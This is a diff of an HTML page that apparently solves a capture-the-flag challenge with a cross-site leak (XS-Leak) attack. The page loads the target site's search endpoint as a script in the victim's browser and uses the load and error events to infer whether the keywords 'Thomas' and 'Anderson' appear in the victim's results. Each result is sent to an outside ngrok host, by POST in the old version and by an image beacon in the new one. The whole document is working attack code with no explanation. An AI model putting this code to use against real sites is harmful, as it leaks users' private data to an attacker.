@@ -3,46 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XS-Leak Example</title>
+    <title>XS-Leak Keyword Checker</title>
     <script>
         async function logResult(keyword, status) {
             try {
-                const response = await fetch('https://e206-87-4-142-72.ngrok-free.app/log', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ keyword, status })
-                });
-                if (!response.ok) {
-                    console.error('Failed to log result:', response.status, response.statusText);
-                }
+                const img = new Image();
+                img.src = `https://acca-87-4-142-72.ngrok-free.app/log?keyword=${encodeURIComponent(keyword)}&status=${status}`;
             } catch (error) {
                 console.error('Error logging result:', error);
             }
         }
 
-        async function checkKeywords() {
+        function checkKeywords() {
             const keywords = ['Thomas', 'Anderson'];
 
             for (const keyword of keywords) {
-                try {
-                    const response = await fetch(`https://matrix.capturetheflags.site/search?s=${encodeURIComponent(keyword)}`, {
-                        method: 'GET',
-                        credentials: 'include',
-                        mode: 'no-cross'
-                    });
+                const script = document.createElement('script');
+                script.src = `https://matrix.capturetheflags.site/search?s=${encodeURIComponent(keyword)}`;
 
-                    if (response.status === 200) {
-                        console.log(`Keyword found: ${keyword}`);
-                        await logResult(keyword, 'found');
-                    } else if (response.status === 404) {
-                        console.log(`Keyword not found: ${keyword}`);
-                        await logResult(keyword, 'not found');
-                    }
-                } catch (error) {
-                    console.error('Error during keyword check:', error);
-                }
+                script.onload = () => {
+                    console.log(`Keyword found: ${keyword}`);
+                    logResult(keyword, 'found');
+                };
+
+                script.onerror = () => {
+                    console.log(`Keyword not found: ${keyword}`);
+                    logResult(keyword, 'not found');
+                };
+
+                document.head.appendChild(script);
             }
         }
 
